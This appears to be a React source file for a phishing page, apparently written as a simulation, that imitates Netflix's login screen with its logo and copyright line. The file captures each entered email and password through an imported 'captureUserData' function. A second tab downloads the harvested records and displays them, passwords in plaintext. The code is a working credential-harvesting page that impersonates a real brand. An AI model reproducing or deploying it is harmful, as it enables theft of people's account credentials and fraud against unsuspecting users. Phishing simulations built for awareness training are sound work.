import React, { useState } from 'react';
import { TextField, Button, Container, Typography, Paper, Tabs, Tab, List, ListItem, ListItemText, Divider } from '@mui/material';
import logoImage from '../images/Logonetflix.png'; // Importa la imagen
import { captureUserData, downloadUserData } from '../logic/simlogic';

import './simpage.css'; // Archivo CSS para estilos específicos

const PhishingPage = () => {
  const [tabValue, setTabValue] = useState(0); // Estado para controlar la pestaña seleccionada
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [userData, setUserData] = useState(null); // Estado para almacenar los datos descargados

  const handleTabChange = (event, newValue) => {
    setTabValue(newValue);
    if (newValue === 1) {
      // Si se cambia a la pestaña de descargar datos, realizar la solicitud
      fetchData();
    }
  };

  const handleLogin = async () => {
    try {
      const responseData = await captureUserData(email, password);
      console.log('Respuesta del servidor:', responseData);
      // Aquí podrías manejar la respuesta del servidor según tus necesidades
    } catch (error) {
      // Manejo de errores
      console.error('Error al intentar iniciar sesión:', error);
      // Puedes mostrar un mensaje de error al usuario, por ejemplo
    }
  };

  const fetchData = async () => {
    try {
      const data = await downloadUserData();
      setUserData(data); // Almacena los datos obtenidos en el estado
    } catch (error) {
      console.error('Error al descargar datos de usuario:', error);
      // Puedes mostrar un mensaje de error al usuario, por ejemplo
    }
  };

  return (
    <Container maxWidth="sm" className="center-container">
      <img src={logoImage} alt="Logo" className="logo-img" /> {/* Utiliza la imagen importada */}
      <Paper elevation={3} className="login-form">
        {/* Contenido del formulario de inicio de sesión */}
        {tabValue === 0 && (
          <>
            <Typography variant="h4" gutterBottom>
              Iniciar sesión
            </Typography>
            <TextField
              label="Nombre de usuario"
              variant="outlined"
              fullWidth
              margin="normal"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />
            <TextField
              label="Contraseña"
              variant="outlined"
              fullWidth
              margin="normal"
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <Button variant="contained" color="primary" onClick={handleLogin}>
              Iniciar sesión
            </Button>
          </>
        )}

        {/* Contenido para descargar datos */}
        {tabValue === 1 && (
          <>
            <Typography variant="h4" gutterBottom>
              Datos de usuarios
            </Typography>
            <Paper elevation={2} style={{ maxHeight: '300px', overflow: 'auto', marginBottom: '10px' }} className="card">
              <List className="card">
                {userData ? (
                  userData.map((user, index) => (
                    <React.Fragment key={index}>
                      <ListItem className="card">
                        <ListItemText
                          primary={`ID: ${user.id}`}
                          secondary={`Email: ${user.email}`}
                          primaryTypographyProps={{ style: { color: '#FFFFFF' } }} // Establece el color blanco para el texto principal
                          secondaryTypographyProps={{ style: { color: '#FFFFFF' } }} // Establece el color blanco para el texto secundario
                        />
                      </ListItem>
                      <ListItem>
                        <ListItemText
                          secondary={`Password: ${user.password}`}
                          secondaryTypographyProps={{ style: { color: '#FFFFFF' } }} // Establece el color blanco para el texto secundario
                        />
                      </ListItem>
                      <Divider />
                    </React.Fragment>
                  ))
                ) : (
                  <ListItem>
                    <ListItemText primary="No hay datos disponibles" />
                  </ListItem>
                )}
              </List>
            </Paper>
          </>
        )}

      </Paper>

      {/* Tabs como footer */}
      <Typography variant="body2" color="white" align="center" style={{ marginTop: '20px', marginBottom: '50vh'}}>
        &copy; 2024 Netflix. Todos los derechos reservados.
      </Typography>
      <Tabs value={tabValue} onChange={handleTabChange} aria-label="tabs" className="footer-tabs">
        <Tab label="Inicio de sesión" />
        <Tab label="Descargar datos" />
      </Tabs>
    </Container>
  );
};

export default PhishingPage;
